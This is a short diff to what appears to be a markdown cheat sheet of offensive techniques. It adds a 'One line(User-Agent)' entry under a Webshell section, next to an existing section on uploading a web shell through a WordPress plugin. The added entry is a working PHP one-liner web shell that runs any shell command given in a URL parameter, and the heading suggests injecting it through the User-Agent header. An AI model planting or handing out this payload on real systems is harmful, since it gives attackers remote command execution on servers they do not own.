@@ -399,6 +399,12 @@ xterm-256color
 
 # Webshell
 
+## One line(User-Agent)
+
+~~~ php
+<?php echo system($_GET['cmd']); ?>
+~~~
+
 ## Webshell upload via Wordpress plugin
 
 ~~~ php
